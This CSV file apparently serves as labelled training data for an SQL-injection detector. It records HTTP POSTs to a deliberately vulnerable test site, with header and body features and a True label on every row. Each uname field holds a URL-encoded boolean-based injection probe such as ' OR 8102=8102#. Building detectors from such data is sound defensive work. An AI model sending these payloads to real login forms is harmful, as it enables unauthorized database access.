url,method,body,header,sql_injection_keywords_url,sql_injection_keywords_body,sql_injection_keywords_header,header_entropy,body_entropy,number_of_special_chars,count_query_params,body_special_chars,query_param_length,path_depth,sql_injection
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%60%29%20WHERE%201124%3D1124%20AND%201002%3D8751%23&pass=fsdfsdf,"{""Content-Length"": ""76"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.3420183033411845,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=fdsfds%60%29%20WHERE%205143%3D5143%20AND%205055%3D5055%23&pass=fsdfsdf,"{""Content-Length"": ""76"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.28510477756102,154,0,12,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=fdsfds%60%29%20WHERE%205143%3D5143%20AND%205055%3D5055%23&pass=fsdfsdf,"{""Content-Length"": ""76"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.28510477756102,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9621&pass=fsdfsdf,"{""Content-Length"": ""24"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,1,98,5.268043071230232,3.8035088547976783,154,0,4,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-9621&pass=fsdfsdf,"{""Content-Length"": ""24"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,1,98,5.268043071230232,3.8035088547976783,154,0,4,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-1182%27%29%20OR%202534%3D2259%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.24757673695581,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-2664%27%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.2722731314778155,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-8926%27%20OR%209291%3D1669%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.295746773031725,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-8926%27%20OR%209291%3D1669%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.295746773031725,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-1394%27%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.280340905640633,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-2465%27%20OR%209442%3D2627%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.244925854752683,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-2465%27%20OR%209442%3D2627%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.244925854752683,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-7289%27%20USymSOXIJM%23&pass=fsdfsdf,"{""Content-Length"": ""43"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,4,98,5.261628376279755,4.553944405764262,154,0,7,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-7155%22%20OR%201282%3D4190%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.3182652025778525,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-7155%22%20OR%201282%3D4190%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.3182652025778525,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-5994%22%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.26744428429881,154,0,9,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-5994%22%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""49"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,6,98,5.264753597546021,4.26744428429881,154,0,9,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-2632%27%29%29%20OR%207393%3D2088%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.107630396282637,154,0,11,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-9237%27%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""55"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,8,98,5.260222532575358,4.136896586726943,154,0,11,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-3557%27%29%29%29%20OR%205852%3D7034%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.1852301329094015,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-6511%27%29%29%29%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""58"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,9,98,5.262106162555172,4.202134443105025,154,0,12,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-5137%25%27%20OR%206016%3D4668%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.366130526116974,154,0,10,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-5137%25%27%20OR%206016%3D4668%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.366130526116974,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-1390%25%27%20OR%208102%3D8102%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.218986594301527,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-6292%25%27%20OR%206292%3D2501%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.157385276650179,154,0,10,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-6292%25%27%20OR%206292%3D2501%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.157385276650179,154,0,10,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-6472%25%27%20USymSOXIJM%23&pass=fsdfsdf,"{""Content-Length"": ""46"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,5,98,5.262106162555172,4.559115695696137,154,0,8,0,1,True
http://testphp.vulnweb.com/userinfo.php,0,uname=-5625%22%29%20OR%208409%3D2812%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.24757673695581,154,0,10,0,1,True
http://testphp.vulnweb.com/login.php,0,uname=-5625%22%29%20OR%208409%3D2812%23&pass=fsdfsdf,"{""Content-Length"": ""52"", ""Host"": ""testphp.vulnweb.com"", ""Cache-Control"": ""max-age=0"", ""Origin"": ""http://testphp.vulnweb.com"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"", ""Sec-GPC"": ""1"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ""http://testphp.vulnweb.com/login.php"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""close""}",3,7,98,5.266637227525836,4.24757673695581,154,0,10,0,1,True
